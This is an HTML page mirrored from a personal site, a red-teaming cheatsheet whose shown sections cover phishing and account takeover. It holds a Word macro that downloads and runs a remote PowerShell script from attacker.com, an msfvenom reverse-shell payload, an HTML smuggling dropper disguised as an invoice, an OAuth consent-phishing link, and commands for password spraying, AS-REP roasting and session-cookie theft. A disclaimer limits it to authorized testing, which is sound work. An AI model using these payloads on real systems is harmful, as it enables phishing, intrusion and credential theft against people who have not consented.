@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from www.emmanuelsolis.com/red_teaming.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:44:32 GMT -->
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Red Teaming | Cheatsheet</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="img/favicon.png" rel="icon">
+  <link href="img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="vendor/aos/aos.css" rel="stylesheet">
+  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Prism CSS -->
+  <link href="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+  <!-- Template Main CSS File -->
+  <link href="css/style.css" rel="stylesheet">
+
+  <!-- Open Graph meta tags -->
+  <meta property="og:title" content="Red Teaming Cheatsheet">
+  <meta property="og:description" content="A list of commands and tips for Red Teaming.">
+  <meta property="og:image" content="img/favicon.png">
+  <meta property="og:url" content="pjmt.html">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Red Teaming Cheatsheet">
+  <meta name="twitter:description" content="A list of commands and tips for Red Teaming.">
+  <meta name="twitter:image" content="img/favicon.png">
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <i class="bi bi-list mobile-nav-toggle d-xl-none"></i>
+
+  <!-- ======= Header ======= -->
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <img src="img/profile-img.jpg" alt="" class="img-fluid rounded-circle">
+        <h1 class="text-light"><a href="index-2.html">Emmanuel Solis</a></h1>
+        <div class="social-links mt-3 text-center">
+          <a href="https://www.linkedin.com/in/emmasolis/" target="_blank" class="linkedin"><i
+              class="bx bxl-linkedin"></i></a>
+          <a href="https://github.com/emmasolis1" target="_blank" class="github"><i class="bx bxl-github"></i></a>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="index-2.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li><a href="resume.html" class="nav-link scrollto"><i class="bi bi-file-earmark-text navicon"></i>
+              <span>Resume</span></a></li>
+          <li><a href="portfolio.html" class="nav-link scrollto"><i
+                class="bi bi-images navicon navicon"></i><span>Portfolio</span></a></li>
+          <li><a href="https://coff.ee/emmanuelsolis" target="_blank" class="nav-link scrollto"><i
+                class="bi bi-heart navicon"></i>Buy Me a Coffee</a></li>
+          <li class="dropdown">
+            <a href="cheatsheets.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
+                class="bi bi-hdd-stack navicon"></i>Cheatsheets <span class="arrow">▼</span></a>
+            <ul id="submenu" class="submenu open">
+              <li><a href="ad_pentesting.html" class="nav-link scrollto"><i
+                    class="bi bi-shield-lock navicon"></i>Active Directory Pentesting</a></li>
+              <li><a href="mobile_pentesting.html" class="nav-link scrollto"><i class="bi bi-phone navicon"></i>Mobile
+                  Pentesting</a></li>
+              <li><a href="oscp.html" class="nav-link scrollto"><img src="img/oscp_icon.png" alt="OSCP Icon"
+                    style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSCP+</a></li>
+              <li><a href="oswp.html" class="nav-link scrollto"><img src="img/oswp_icon.png" alt="OSWP Icon"
+                    style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">OSWP</a></li>
+              <li><a href="pjmt.html" class="nav-link scrollto"><img src="img/pjmt_icon.png" alt="PJMT Icon"
+                    style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">PJMT</a></li>
+              <li><a href="red_teaming.html" class="nav-link scrollto active"><i
+                    class="bi bi-shield-lock navicon"></i>Red Teaming</a></li>
+              <li><a href="security_plus.html" class="nav-link scrollto"><img src="img/security_icon.png"
+                    alt="Security+ Icon"
+                    style="width: 28px; height: auto; vertical-align: middle; margin-right: 4px;">Security+</a></li>
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>Red Teaming Cheatsheet</h2>
+          <ol>
+            <li><a href="index-2.html">Home</a></li>
+            <li>Red Teaming Cheatsheet</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+            <!-- ======= Disclaimer Alert ======= -->
+            <div class="alert alert-danger alert-dismissible fade show" role="alert" data-aos="fade-right">
+              <strong>Disclaimer:</strong> This cheatsheet is provided for educational and authorized security testing
+              purposes only. All techniques, tools, and methods described herein must be used only in environments
+              <strong>you have explicit permission to perform security assessments</strong>. The author(s) of this
+              cheatsheet are not responsible for any misuse or damage resulting from the application of this material.
+              <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            </div>
+            <div class="cheatsheet-content">
+              <h2 id="🛬-1-initial-access">🛬 1. Initial Access</h2>
+              <h3 id="11-phishing">1.1 Phishing</h3>
+              <h4 id="111-basic-techniques">1.1.1 Basic Techniques</h4>
+              <h5 id="1111-malicious-word-macro-maldoc">1.1.1.1 Malicious Word Macro (Maldoc)</h5>
+              <p><strong>Steps</strong>:</p>
+              <ol>
+                <li>Create a <code>.docm</code> file in Word.</li>
+                <li>Insert a VBA macro with the following code:</li>
+              </ol>
+              <pre><code class="language-vba">Sub AutoOpen()
+    Dim str As String
+    str = &quot;powershell -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString(&#39;http://attacker.com/shell.ps1&#39;))&quot;
+    Shell str, vbHide
+End Sub
+</code></pre>
+              <ol start="3">
+                <li>Use <strong>MSFVenom</strong> to generate the payload:</li>
+              </ol>
+              <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f ps1 &gt; shell.ps1
+</code></pre>
+              <ol start="4">
+                <li>Host the file:</li>
+              </ol>
+              <pre><code class="language-bash">python3 -m http.server 80
+</code></pre>
+              <ol start="5">
+                <li>Email the victim using <strong>GoPhish</strong>, <strong>King Phisher</strong>, or <strong>manual
+                    spoofed
+                    email</strong> (e.g., using <code>sendmail</code>, <code>phishery</code>).</li>
+              </ol>
+              <h5 id="1112-html-smuggling-modern-bypass">1.1.1.2 HTML Smuggling (Modern bypass)</h5>
+              <pre><code class="language-html">&lt;!-- Save as smuggler.html --&gt;
+&lt;script&gt;
+const blob = new Blob([&quot;...payload content...&quot;], { type: &#39;application/octet-stream&#39; });
+const link = document.createElement(&quot;a&quot;);
+link.href = URL.createObjectURL(blob);
+link.download = &quot;Invoice.exe&quot;;
+link.click();
+&lt;/script&gt;
+</code></pre>
+              <ol>
+                <li>Minify and obfuscate with tools
+                  like <strong>HTMLMinifier</strong> or <strong>Obfuscator.io</strong>.</li>
+                <li>Host on trusted-looking domain using services like Netlify, GitHub Pages, etc.</li>
+                <li>Deliver via spoofed email.</li>
+              </ol>
+              <h4 id="112-advanced-techniques">1.1.2 Advanced Techniques</h4>
+              <h5 id="1121-consent-phishing-microsoft-oauth-abuse">1.1.2.1 Consent Phishing (Microsoft OAuth Abuse)</h5>
+              <ol>
+                <li>Register a malicious app in Azure: Add <code>User.Read</code>, <code>Mail.Read</code>, or <code>Files.Read.All</code> scope.</li>
+                <li>Craft URL:</li>
+              </ol>
+              <pre><code class="language-bash">https://login.microsoftonline.com/common/oauth3/v2.0/authorize? client_id=&lt;malicious_app_id&gt;&amp;response_type=code&amp; redirect_uri=https://attacker.com/callback&amp; scope=Files.Read.All+offline_access
+</code></pre>
+              <ol start="3">
+                <li>Victim authorizes → you receive token → access cloud data (via Microsoft Graph API).</li>
+              </ol>
+              <h5 id="1122-phishing-via-compromised-internal-account">1.1.2.2 Phishing via Compromised Internal Account
+              </h5>
+              <ul>
+                <li>After breaching a low-priv user, dump their mailbox:</li>
+              </ul>
+              <pre><code class="language-powershell">Export-Mailbox -Identity &quot;user1@corp.local&quot; -PSTFolderPath C:\outlook.pst
+</code></pre>
+              <ul>
+                <li>Reuse reply threads to bypass user suspicion.</li>
+                <li>Drop payloads via <strong>OneDrive links</strong> with enticing file names
+                  (<code>Q3_Bonus.exe</code>, <code>UrgentInvoice.docm</code>).</li>
+              </ul>
+              <h3 id="12-valid-accounts">1.2 Valid Accounts</h3>
+              <h4 id="121-basic-techniques">1.2.1 Basic Techniques</h4>
+              <h5 id="1211-password-spraying-with-crackmapexec">1.2.1.1 Password Spraying with CrackMapExec</h5>
+              <pre><code class="language-bash">crackmapexec smb 10.10.10.0/24 -u users.txt -p &#39;Spring2025!&#39; --no-bruteforce
+</code></pre>
+              <ul>
+                <li>Use <code>GetNPUsers.py</code> for AS-REP Roasting:</li>
+              </ul>
+              <pre><code class="language-bash">GetNPUsers.py -no-pass CORP.LOCAL/ -usersfile users.txt -dc-ip 10.10.10.2
+</code></pre>
+              <h5 id="1212-session-hijacking">1.2.1.2 Session Hijacking</h5>
+              <ol>
+                <li>Use <code>Bettercap</code> or <code>Evilginx</code> to extract session cookies:</li>
+              </ol>
+              <pre><code class="language-bash">set http.proxy.sslstrip true set http.proxy.injectjs file.js set http.proxy.script filter-cookies.js
+</code></pre>
+              <ol start="2">
+                <li>Load cookie in browser via <em>EditThisCookie</em> extension.</li>
+              </ol>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Cheatsheet Section -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Index ======= -->
+  <div class="index-btn" onclick="toggleIndex()">Index</div>
+  <div id="index" class="index">
+    <div class="container mt-3">
+      <div class="input-group mb-3">
+        <input type="text" id="search-input" class="form-control" placeholder="Search sections..."
+          aria-label="Search sections" aria-describedby="search-button">
+        <button class="btn btn-primary" type="button" id="search-button">
+          <i class="bi bi-search"></i>
+        </button>
+      </div>
+    </div>
+    <button class="expand-collapse-btn" onclick="toggleAll()">Show/Hide All</button>
+
+    <!-- Initial Access -->
+    <div class="section-rose">
+      <button class="dropdown-btn">1. <span class="emoji">🛬</span> Initial Access
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#1-1-phishing">1.1 Phishing (spear, maldoc)</a>
+        <a href="#1-2-valid-accounts">1.2 Valid Accounts</a>
+        <a href="#1-3-drive-by-compromise">1.3 Drive-by Compromise</a>
+        <a href="#1-4-exploits">1.4 Exploits (RCE, 0-days)</a>
+        <a href="#1-5-usb-attacks">1.5 USB/Removable Media Attacks</a>
+      </div>
+    </div>
+
+    <!-- Execution -->
+    <div class="section-mint-green">
+      <button class="dropdown-btn">2. <span class="emoji">⚙️</span> Execution
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#2-1-lolbins">2.1 LOLBins</a>
+        <a href="#2-2-payloads">2.2 PowerShell / C# / Python / Bash Payloads</a>
+        <a href="#2-3-scheduled-wmi">2.3 Scheduled Tasks / WMI</a>
+        <a href="#2-4-dll-techniques">2.4 DLL Hijacking / Sideloading</a>
+        <a href="#2-5-script-execution">2.5 HTA, JS & Other Script Executions</a>
+      </div>
+    </div>
+
+    <!-- Persistence -->
+    <div class="section-lemon">
+      <button class="dropdown-btn">3. <span class="emoji">🔁</span> Persistence
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#3-1-registry">3.1 Registry Keys</a>
+        <a href="#3-2-scheduled-tasks">3.2 Scheduled Tasks</a>
+        <a href="#3-3-startup-folders">3.3 Startup Folders</a>
+        <a href="#3-4-services">3.4 Services</a>
+        <a href="#3-5-office-macros">3.5 Office Macros</a>
+        <a href="#3-6-implant-c2">3.6 Implant Persistence (C2 Frameworks)</a>
+      </div>
+    </div>
+
+    <!-- Privilege Escalation -->
+    <div class="section-light-coral">
+      <button class="dropdown-btn">4. <span class="emoji">🚀</span> Privilege Escalation
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#4-1-token-manipulation">4.1 Token Manipulation</a>
+        <a href="#4-2-uac-bypass">4.2 UAC Bypass</a>
+        <a href="#4-3-kernel-exploits">4.3 Kernel Exploits</a>
+        <a href="#4-4-unquoted-paths">4.4 Unquoted Service Paths</a>
+        <a href="#4-5-dll-hijacking">4.5 DLL Hijacking</a>
+        <a href="#4-6-misconfig-exploit">4.6 Misconfigurations Exploitation</a>
+      </div>
+    </div>
+
+    <!-- Defense Evasion -->
+    <div class="section-lavender">
+      <button class="dropdown-btn">5. <span class="emoji">🎭</span> Defense Evasion
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#5-1-amsi-bypass">5.1 AMSI Bypass</a>
+        <a href="#5-2-av-edr-evasion">5.2 AV/EDR Evasion</a>
+        <a href="#5-3-obfuscation">5.3 Obfuscation</a>
+        <a href="#5-4-binary-packing">5.4 Binary Packing/Stubbing</a>
+        <a href="#5-5-time-evasion">5.5 Time-based Evasion</a>
+        <a href="#5-6-masquerading">5.6 Masquerading</a>
+      </div>
+    </div>
+
+    <!-- Credential Access -->
+    <div class="section-salmon">
+      <button class="dropdown-btn">6. <span class="emoji">🔐</span> Credential Access
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#6-1-mimikatz-suite">6.1 Mimikatz / LaZagne / Rubeus</a>
+        <a href="#6-2-lsass-dump">6.2 LSASS Dump</a>
+        <a href="#6-3-sam-extraction">6.3 SAM Extraction</a>
+        <a href="#6-4-spraying-bruteforce">6.4 Credential Spraying / Brute Force</a>
+        <a href="#6-5-keylogging">6.5 Keylogging</a>
+        <a href="#6-6-clipboard">6.6 Clipboard Access</a>
+      </div>
+    </div>
+
+    <!-- Discovery -->
+    <div class="section-seafoam">
+      <button class="dropdown-btn">7. <span class="emoji">🔎</span> Discovery
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#7-1-ad-enum">7.1 AD Enumeration</a>
+        <a href="#7-2-network-scan">7.2 Network Scanning</a>
+        <a href="#7-3-user-group">7.3 User/Group Listing</a>
+        <a href="#7-4-shares-drives">7.4 Shares and Drives</a>
+        <a href="#7-5-system-details">7.5 System Details</a>
+        <a href="#7-6-domain-trusts">7.6 Domain Trusts</a>
+      </div>
+    </div>
+
+    <!-- Lateral Movement -->
+    <div class="section-soft-grey">
+      <button class="dropdown-btn">8. <span class="emoji">🔁</span> Lateral Movement
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#8-1-psexec">8.1 PsExec / WMI / SMB / WinRM</a>
+        <a href="#8-2-pass-tech">8.2 Pass-the-Hash / Pass-the-Ticket</a>
+        <a href="#8-3-rdp">8.3 Remote Desktop Protocol (RDP)</a>
+        <a href="#8-4-creds-reuse">8.4 Credential Reuse</a>
+        <a href="#8-5-wmi-subscription">8.5 WMI Event Subscription</a>
+      </div>
+    </div>
+
+    <!-- Command and Control -->
+    <div class="section-sky-blue">
+      <button class="dropdown-btn">9. <span class="emoji">📡</span> Command & Control (C2)
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#9-1-c2-frameworks">9.1 C2 Frameworks</a>
+        <a href="#9-2-protocols">9.2 Protocols (HTTP/S, DNS, etc.)</a>
+        <a href="#9-3-beacon-config">9.3 Beacon Configuration</a>
+        <a href="#9-4-c2-evasion">9.4 C2 Evasion</a>
+        <a href="#9-5-one-liners">9.5 Reverse Shells & One-Liners</a>
+      </div>
+    </div>
+
+    <!-- Exfiltration -->
+    <div class="section-peach">
+      <button class="dropdown-btn">10. <span class="emoji">📤</span> Exfiltration
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#10-1-compression">10.1 Compressing & Encoding Data</a>
+        <a href="#10-2-common-ports">10.2 Using Common Ports</a>
+        <a href="#10-3-cloud-exfil">10.3 Cloud Exfiltration</a>
+        <a href="#10-4-dns-icmp">10.4 DNS/ICMP Tunnels</a>
+      </div>
+    </div>
+
+    <!-- Impact -->
+    <div class="section-dusty-rose">
+      <button class="dropdown-btn">11. <span class="emoji">💣</span> Impact / Actions on Objectives
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#11-1-data-destruction">11.1 Data Destruction</a>
+        <a href="#11-2-ransomware">11.2 Ransomware Deployment</a>
+        <a href="#11-3-account-manip">11.3 Account Manipulation</a>
+        <a href="#11-4-data-exfil">11.4 Data Extraction</a>
+        <a href="#11-5-defacement">11.5 Defacement / Persistence</a>
+      </div>
+    </div>
+
+    <!-- Technical Sections -->
+    <div class="section-pastel-green">
+      <button class="dropdown-btn">12. 🔧 Technical Sections
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#12-1-tools">12.1 Tools</a>
+        <a href="#12-2-payloads">12.2 Payloads & One-Liners</a>
+        <a href="#12-3-opsec">12.3 OPSEC Notes</a>
+        <a href="#12-4-mitre">12.4 MITRE ATT&CK Mapping</a>
+        <a href="#12-5-infra">12.5 C2 Infrastructure Setup</a>
+      </div>
+    </div>
+
+    <!-- Bonus -->
+    <div class="section-light-gold">
+      <button class="dropdown-btn">13. 🎯 Bonus
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
+        <a href="#13-1-bonus-scenarios">13.1 Realistic Scenarios</a>
+        <a href="#13-2-bonus-checklists">13.2 Checklists</a>
+        <a href="#13-3-bonus-reporting">13.3 Reporting Templates</a>
+      </div>
+    </div>
+
+  </div>
+  <!-- End Index -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="credits">
+        <p>
+          &copy; Emmanuel Solis<br>
+          Pentester &amp; Red Teamer
+        </p>
+      </div>
+    </div>
+  </footer><!-- End  Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="vendor/purecounter/purecounter.js"></script>
+  <script src="vendor/aos/aos.js"></script>
+  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="vendor/typed.js/typed.min.js"></script>
+  <script src="vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="vendor/php-email-form/validate.js"></script>
+
+  <!-- Prism JS -->
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-bash.min.js"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-powershell.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="js/main.js"></script>
+
+  <!-- Prism JS Additional Keywords-->
+  <script>
+    Prism.languages.bash = Prism.languages.extend('bash', {
+      'function': /\b(?:aircrack-ng|amap|arpspoof|beef|bettercap|bloodhound|burpsuite|ldapsearch|cain|crackmapexec|cewl|curl|cd|dirb|dnsenum|dnsspoof|dnstracer|enum4linux|ettercap|echo|xfreerdp|rdesktop|chmod|mv|sudo|ssh|find|etterfilter|exploitdb|ftp|gobuster|hashcat|hashid|hash-identifier|hydra|httrack|smbmap|impacket-GetNPUsers|impacket-GetTGT|impacket-psexec|impacket-secretsdump|impacket-smbexec|ike-scan|john|kerbrute|linenum|linpeas|ls|maltego|masscan|medusa|metasploit|mimikatz|ms08-067|msfcli|msfconsole|msfupdate|msfvenom|nbtscan|nc|netcat|netdiscover|netstat|nikto|nmap|nslookup|openssh|patator|ping|powershell-empire|powersploit|proxychains|psexec|python|python2|python2.7|python3|reaver|responder|scp|searchsploit|setoolkit|shellshock|smtp-user-enum|smbclient|snmp-check|snmpwalk|sparta|sqlmap|sqlninja|sslscan|sublist3r|tcpdump|telnet|whois|theHarvester|tmux|tshark|ticketer|unicornscan|veil|volatility|wfuzz|whatweb|wireshark|windows-exploit-suggester|w3af|xsser|xsstrike|rpcclient|zaproxy)\b/
+    });
+  </script>
+  <script>
+    Prism.languages.powershell = Prism.languages.extend('powershell', {
+      'function': /\b(?:Add-ADGroupMember|Add-Computer|Add-Content|Add-ExchangeAdministrator|Add-Member|Add-Type|Checkpoint-Computer|Clear-Content|Clear-History|Clear-Item|Clear-ItemProperty|Clear-Variable|Compare-Object|ConvertFrom-Json|ConvertTo-Json|Copy-Item|Copy-ItemProperty|Disable-ADAccount|Disable-PSRemoting|Enable-ADAccount|Enable-PSRemoting|Export-Csv|Export-ModuleMember|Export-PSSession|Find-Module|Get-ADComputer|Get-ADDomain|Get-ADGroup|Get-ADUser|Get-Alias|Get-AuthenticodeSignature|Get-ChildItem|Get-Clipboard|Get-Command|Get-Content|Get-Credential|Get-Date|Get-EventLog|Get-Help|Get-History|Get-Item|Get-ItemProperty|Get-LocalGroupMember|Get-Location|Get-Member|Get-Module|Get-Process|Get-Service|Get-Variable|Get-WinEvent|Import-Csv|Import-Module|Invoke-Command|Invoke-Expression|Invoke-RestMethod|Invoke-WebRequest|Measure-Object|Move-Item|New-ADUser|New-Alias|New-Item|New-Module|New-PSDrive|New-PSSession|Out-File|Read-Host|Remove-ADUser|Remove-Item|Remove-Module|Remove-PSDrive|Remove-Variable|Restart-Computer|Restore-Computer|Select-Object|Set-ADUser|Set-Alias|Set-Content|Set-Date|Set-Item|Set-Location|Set-Variable|Start-Process|Stop-Process|Test-Connection|Test-Path|Update-Help|Write-Host|Write-Output)\b/
+    });
+  </script>
+
+  <script>
+    let allOpen = false; // Track the state of the dropdowns
+
+    function toggleIndex() {
+      const index = document.getElementById('index');
+      index.classList.toggle('open');
+    }
+
+    function toggleAll() {
+      const dropdownContainers = document.querySelectorAll('.dropdown-container, .nested-dropdown-container');
+      const buttons = document.querySelectorAll('.dropdown-btn, .nested-dropdown-btn');
+
+      // Set the new state based on the current state
+      allOpen = !allOpen;
+
+      for (let i = 0; i < dropdownContainers.length; i++) {
+        const container = dropdownContainers[i];
+        const btn = buttons[i];
+        if (allOpen) {
+          container.style.display = 'block';
+          btn.classList.add('active');
+        } else {
+          container.style.display = 'none';
+          btn.classList.remove('active');
+        }
+      }
+    }
+
+    const dropdownBtns = document.getElementsByClassName("dropdown-btn");
+    for (let i = 0; i < dropdownBtns.length; i++) {
+      dropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const dropdownContent = this.nextElementSibling;
+        if (dropdownContent.style.display === "block") {
+          dropdownContent.style.display = "none";
+        } else {
+          dropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    const nestedDropdownBtns = document.getElementsByClassName("nested-dropdown-btn");
+    for (let i = 0; i < nestedDropdownBtns.length; i++) {
+      nestedDropdownBtns[i].addEventListener("click", function () {
+        this.classList.toggle("active");
+        const nestedDropdownContent = this.nextElementSibling;
+        if (nestedDropdownContent.style.display === "block") {
+          nestedDropdownContent.style.display = "none";
+        } else {
+          nestedDropdownContent.style.display = "block";
+        }
+      });
+    }
+
+    setTimeout(function () {
+      var alert = document.querySelector('.alert-warning');
+      if (alert) {
+        var bootstrapAlert = new bootstrap.Alert(alert);
+        bootstrapAlert.close();
+      }
+    }, 7000); // 7 seconds
+
+    function removeHighlights(element) {
+      element.innerHTML = element.innerHTML.replace(/<\/?strong>/gi, "");
+    }
+
+    function highlightTerm(element, term) {
+      const regex = new RegExp(`(${term})`, 'gi');
+      element.innerHTML = element.innerHTML.replace(regex, "<strong>$1</strong>");
+    }
+
+    document.getElementById("search-input").addEventListener("input", function () {
+      const searchTerm = this.value.toLowerCase();
+      const headings = document.querySelectorAll(".cheatsheet-content h2, .cheatsheet-content h3, .cheatsheet-content h4, .cheatsheet-content h5, .cheatsheet-content h6");
+      let anyMatch = false;
+
+      headings.forEach((heading) => {
+        const text = heading.textContent.toLowerCase();
+        const sectionContent = [];
+
+        // Get all sibling elements until the next heading
+        let sibling = heading.nextElementSibling;
+        while (sibling && !sibling.matches("h2, h3, h4, h5, h6")) {
+          sectionContent.push(sibling);
+          sibling = sibling.nextElementSibling;
+        }
+
+        // Remove existing highlights
+        removeHighlights(heading);
+
+        // Only show headings and content that match the search term
+        if (text.includes(searchTerm)) {
+          heading.style.display = "";
+          sectionContent.forEach((elem) => (elem.style.display = ""));
+          if (searchTerm) {
+            highlightTerm(heading, searchTerm);
+          }
+
+          anyMatch = true;
+        } else {
+          // Hide non-matching headings and content
+          heading.style.display = "none";
+          sectionContent.forEach((elem) => (elem.style.display = "none"));
+        }
+      });
+
+      const noMatchMessage = document.getElementById("no-match-message");
+      if (!anyMatch) {
+        if (!noMatchMessage) {
+          const message = document.createElement("p");
+          message.id = "no-match-message";
+          message.className = "text-danger mt-3";
+          message.textContent = "No matches found.";
+          document.querySelector(".cheatsheet-content").appendChild(message);
+        }
+      } else if (noMatchMessage) {
+        noMatchMessage.remove();
+      }
+    });
+
+    function toggleSubmenu(event) {
+      event.preventDefault(); // Prevents navigation
+      const submenu = event.currentTarget.nextElementSibling;
+      const arrow = event.currentTarget.querySelector('.arrow');
+
+      submenu.classList.toggle('open'); // Toggle the submenu visibility
+      // Rotate the arrow based on whether the submenu is open
+      if (submenu.classList.contains('open')) {
+        arrow.style.transform = 'rotate(0deg)'; // Arrow points right when closed
+      } else {
+        arrow.style.transform = 'rotate(-90deg)';  // Arrow points down when open
+      }
+    }
+  </script>
+
+</body>
+
+
+<!-- Mirrored from www.emmanuelsolis.com/red_teaming.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Aug 2025 18:44:32 GMT -->
+</html>
